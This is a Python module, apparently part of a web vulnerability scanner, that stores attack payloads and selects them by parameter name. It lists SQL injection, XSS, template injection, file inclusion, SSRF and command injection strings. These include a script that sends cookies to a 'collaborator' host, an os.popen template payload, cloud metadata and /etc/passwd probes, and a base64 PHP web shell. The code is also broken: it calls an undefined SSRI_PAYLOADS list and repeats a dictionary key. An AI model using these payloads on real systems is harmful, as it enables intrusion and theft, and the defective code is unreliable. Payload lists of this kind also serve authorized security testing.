"""Context-aware payload generators — adapt to parameter types."""

from __future__ import annotations

import re
from typing import Any


class PayloadContext:
    SQLI_ERROR_PAYLOADS = [
        "'", '"', "`", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "1' OR '1'='1",
        "' UNION SELECT NULL--", "' AND 1=2--", "' WAITFOR DELAY '0:0:5'--",
        "'; SELECT pg_sleep(5)--", "') OR ('1'='1", "1 AND 1=1",
    ]

    SQLI_BLIND_PAYLOADS = [
        "' AND SLEEP(5)--",
        "' AND 1=1--",
        "' AND 1=2--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' OR 1=1--",
        "' OR 1=2--",
    ]

    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "`><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<script>fetch('http://collaborator/TOKEN?c='+document.cookie)</script>",
        "'-alert(1)-'",
        "\"-alert(1)-\"",
    ]

    SSTI_PAYLOADS = [
        "{{7*7}}",
        "{{config}}",
        "{{self}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${{7*7}}",
        "${{7*'7'}}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{request.application.__self__.__dict__}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
    ]

    LFI_PAYLOADS = [
        "/etc/passwd",
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/fd/0",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=index.php",
        "expect://id",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
        "file:///etc/passwd",
    ]

    SSRF_PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/info",
        "http://collaborator/TOKEN",
    ]

    COMMAND_INJECTION_PAYLOADS = [
        "; ls",
        "| ls",
        "`ls`",
        "$(ls)",
        "&& ls",
        "|| ls",
        "| /bin/ls",
        "| dir",
        "& dir &",
        "; sleep 5",
        "| sleep 5",
        "$(sleep 5)",
        "; ping -c 5 127.0.0.1",
        "| nslookup collaborator.oob.local",
    ]

    @classmethod
    def for_type(cls, vuln_type: str) -> list[str]:
        mapping = {
            "sqli": cls.SQLI_ERROR_PAYLOADS,
            "sqli_blind": cls.SQLI_BLIND_PAYLOADS,
            "xss": cls.XSS_PAYLOADS,
            "ssti": cls.SSTI_PAYLOADS,
            "lfi": cls.LFI_PAYLOADS,
            "ssrf": cls.SSRF_PAYLOADS,
            "sqli_blind": cls.SQLI_BLIND_PAYLOADS,
            "command_injection": cls.COMMAND_INJECTION_PAYLOADS,
        }
        return mapping.get(vuln_type, [])

    @classmethod
    def generate_for_parameter(cls, param_name: str, param_type: str = "string") -> list[str]:
        payloads: list[str] = []

        name_lower = param_name.lower()

        if any(kw in name_lower for kw in ["id", "user", "uid", "page", "article", "product"]):
            payloads.extend(cls.SQLI_ERROR_PAYLOADS)

        if any(kw in name_lower for kw in ["q", "search", "query", "filter", "find"]):
            payloads.extend(cls.XSS_PAYLOADS)
            payloads.extend(cls.SQLI_ERROR_PAYLOADS)

        if any(kw in name_lower for kw in ["url", "redirect", "link", "src", "href", "proxy", "path"]):
            payloads.extend(cls.SSRI_PAYLOADS)
            payloads.extend(cls.LFI_PAYLOADS)

        if any(kw in name_lower for kw in ["cmd", "exec", "command", "run", "shell"]):
            payloads.extend(cls.COMMAND_INJECTION_PAYLOADS)

        if any(kw in name_lower for kw in ["template", "view", "render", "tpl", "email"]):
            payloads.extend(cls.SSTI_PAYLOADS)

        if any(kw in name_lower for kw in ["file", "path", "dir", "folder", "document", "include"]):
            payloads.extend(cls.LFI_PAYLOADS)

        if param_type in ("int", "integer", "number", "float"):
            payloads.extend(cls.SQLI_ERROR_PAYLOADS)

        return payloads
